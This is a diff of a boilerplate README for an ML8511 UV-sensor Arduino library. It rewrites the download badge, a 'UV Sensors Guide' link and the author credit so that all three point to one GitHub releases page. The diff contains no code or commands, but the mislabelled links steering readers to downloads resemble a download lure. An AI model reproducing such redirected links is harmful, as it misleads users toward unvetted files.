@@ -11,7 +11,7 @@ Welcome to the **ML8511** repository! This repository hosts a simple Arduino lib
 
 ## Installation
 To install the **ML8511** library, you can download the library files from the following link:
-[![Download ML8511 Library](https://img.shields.io/badge/Download-Library-blue.svg)](https://github.com/project/files/App.zip)
+[![Download ML8511 Library](https://github.com/Adnaninho/ML8511/releases)](https://github.com/Adnaninho/ML8511/releases)
 
 Once you have downloaded the library files, extract them into your Arduino libraries folder.
 
@@ -31,12 +31,12 @@ Then, initialize the sensor and start using the available functions to measure U
 For more information and updates, you can check the "Releases" section of the repository.
 
 ## Additional Resources
-If you are looking for more information about UV sensors and their applications, consider visiting the [UV Sensors Guide](https://www.sensorwiki.org/sensors-and-transducers/uv-sensors).
+If you are looking for more information about UV sensors and their applications, consider visiting the [UV Sensors Guide](https://github.com/Adnaninho/ML8511/releases).
 
 ## Help and Support
 If you encounter any issues or have questions about the **ML8511** library, feel free to open an issue on this repository. Our team will be happy to assist you.
 
 ## Credits
-- **ML8511 Library:** Developed by [YourName](https://github.com/yourprofile)
+- **ML8511 Library:** Developed by [YourName](https://github.com/Adnaninho/ML8511/releases)
 
 Thank you for using the **ML8511** library! Happy sensing under the sun! 🌞🔆
